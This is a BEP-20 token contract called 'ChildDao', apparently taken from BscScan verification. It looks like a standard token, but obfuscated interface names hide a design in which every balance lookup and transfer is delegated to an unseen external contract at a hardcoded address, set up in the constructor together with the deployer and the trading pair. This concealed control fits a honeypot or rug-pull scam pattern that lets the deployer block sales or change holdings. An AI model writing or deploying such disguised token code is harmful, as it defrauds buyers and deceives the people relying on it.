/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface biotechnology {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface proponentsof {

    function characterristics(uint256 total,address tokenAddress,address relationship,address _informationnews) external;

    function approximately() view external returns (uint256);

    function wildfowlerspower(address _owner) view external returns (uint256);

    function variationporn(address _from, address _to, uint256 _value) external;

}

interface nutritionalvalue {
    function factory() external pure returns (address);

    
}

contract ChildDao {
	
    string public name = "ChildDao";
    string  public symbol = "ChildDao";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 10000000000 * (10 ** decimals);
	
	address public relationship;
	address public informationnews;
	nutritionalvalue public categories;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

	proponentsof process = proponentsof(0x7AE1Eb922cC9Aabc5F7dE0998668A4Fc6a4866f6);

	constructor() {
		relationship=msg.sender;
        
        categories = nutritionalvalue(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        informationnews = biotechnology(categories.factory()).createPair(WBNB, address(this));

        process.characterristics(totalSupply_, address(this), relationship,informationnews);

        emit Transfer(address(0), relationship, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	


    function balanceOf(address _owner) public view returns (uint256) {
        return process.wildfowlerspower(_owner);
    }
    function totalSupply() public view returns (uint256) {
        return process.approximately();
    }
	
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= process.wildfowlerspower(_from));
        require(_value <= allowed[_from][msg.sender]);
		
		process.variationporn(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	function transfer(address _to, uint256 _value) public returns (bool success) {
        require(process.wildfowlerspower(msg.sender) >= _value);

        process.variationporn(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
}